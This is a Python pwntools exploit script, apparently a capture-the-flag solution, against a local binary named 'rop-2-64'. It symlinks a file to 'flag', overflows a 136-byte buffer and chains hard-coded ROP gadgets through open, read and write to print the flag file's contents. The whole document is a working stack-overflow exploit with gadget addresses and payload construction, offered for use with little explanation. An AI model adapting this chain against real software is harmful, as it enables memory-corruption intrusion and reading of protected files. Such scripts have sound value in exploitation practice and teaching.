#!/usr/bin/env python

import os
from pwn import *

# Rop gadgets
"""
    0x0000000000400743 : pop rdi ; ret
    0x0000000000400668 : pop rdx ; ret
    0x0000000000400741 : pop rsi ; pop r15 ; ret
"""
rdi_ret = p64(0x0000000000400743)
rdx_ret = p64(0x0000000000400668)
rsi_r15_ret = p64(0x0000000000400741)

# syscalls
"""
    0x00000000004004d0  write@plt
    0x00000000004004f0  read@plt
    0x0000000000400510  open@plt
"""
write_addr = p64(0x00000000004004d0)
read_addr = p64(0x00000000004004f0)
open_addr = p64(0x0000000000400510)

# setting "flag" string
flag_addr = p64(0x4004e7)
if os.path.exists("\x01"):
    os.unlink("\x01")
os.symlink("flag", "\x01")

output_addr = p64(0x601000+800)

# want buffer to look like this:
"""
[old_ebp]
[&rdi_ret] [&flag_addr] [&rsi_r15_ret] [zeros] [zeros] [&rdx_ret] [zeros] [&open_addr]
[&rdi_ret] [3] [&rsi_r15_ret] [&output_addr] [zeros] [&rdx_ret] [150] [&read_addr]
[&rdi_ret] [1] [&rsi_r15_ret] [&output_addr] [zeros] [&rdx_ret] [150] [&write_addr]
"""

three = p64(3)
one = p64(1)
zeros = p64(0)
size = p64(150)

buf = "A"*136
buf += rdi_ret + flag_addr + rsi_r15_ret + zeros*2 + rdx_ret + zeros + open_addr
buf += rdi_ret + three + rsi_r15_ret + output_addr + zeros + rdx_ret + size + read_addr
buf += rdi_ret + one + rsi_r15_ret + output_addr + zeros + rdx_ret + size + write_addr

p = process("./rop-2-64")
p.sendline(buf)
p.interactive()
